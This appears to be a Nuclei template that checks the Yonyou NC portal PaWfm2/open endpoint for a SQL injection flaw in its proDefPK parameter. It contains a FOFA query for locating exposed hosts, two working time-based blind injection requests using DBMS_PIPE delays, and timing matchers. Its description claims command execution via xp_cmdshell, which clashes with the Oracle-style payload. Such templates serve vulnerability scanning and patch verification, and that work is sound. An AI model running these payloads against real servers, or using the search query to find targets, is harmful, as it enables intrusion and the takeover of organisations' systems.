id: yongyouNC-PaWfm2_open-sql-XVE-2023-29119

info:
  name: "用友 NC Portal PaWfm2 接口 proDefPK 参数 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: icon_hash="1085941792" && body="/logo/images/logo.gif"
      用友NC /portal/pt/PaWfm2/open 接口的 proDefPK 参数存在 SQL 注入漏洞，攻击者可利用该漏洞通过数据库扩展存储过程 xp_cmdshell 执行任意系统命令，导致服务器被完全控制。经分析，该漏洞利用条件较低，建议立即采取修复措施。
  reference:
  - https://mp.weixin.qq.com/s/8jTrAPHqJTX_uRJ7R80hzA
  tags: 用友NC

http:
- raw:
  - |
    GET /portal/pt/PaWfm2/open?pageId=login&proDefPk=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
  - |
    GET /portal/pt/PaWfm2/open?pageId=login&proDefPk=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),8)-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
